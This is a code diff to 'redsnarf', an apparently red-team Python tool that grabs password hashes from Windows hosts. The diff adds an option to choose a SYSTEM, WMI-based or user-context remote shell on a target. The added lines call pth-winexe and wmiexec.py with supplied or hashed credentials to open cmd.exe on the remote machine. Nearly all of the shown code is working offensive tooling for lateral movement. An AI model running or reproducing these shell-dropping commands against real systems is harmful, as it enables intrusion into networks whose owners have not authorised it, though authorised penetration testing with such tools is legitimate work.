@@ -1490,7 +1490,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3a", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3b", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
@@ -2519,10 +2519,21 @@ if dropshell in yesanswers:
 				os.system("wmiexec.py "+user+"@"+targets[0]+" -no-pass 2>/dev/null")
 				sys.exit()
 			else:
-				print colored ('\n[+] Dropping Shell on '+targets[0]+'\n','yellow')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
-				sys.exit()
-				
+				#Check here whether we want a system shell or a shell in the context of the passed creds
+				response = raw_input("Would you like a shell with SYSTEM Privileges?: Y/(N) ")
+				if response in yesanswers:	
+					print colored ('\n[+] Dropping a SYSTEM Shell on '+targets[0]+'\n','yellow')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
+					sys.exit()
+				elif response=="w":
+					print colored ('\n[+] Dropping WMI Based Shell on '+targets[0]+'\n','yellow')
+					os.system("wmiexec.py "+user+":"+passw+"@"+targets[0]+" 2>/dev/null")
+					sys.exit()
+				else:
+					print colored ('\n[+] Dropping Shell on '+targets[0]+'\n','yellow')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
+					sys.exit()
+
 		except:
 			sys.exit()
 	else:
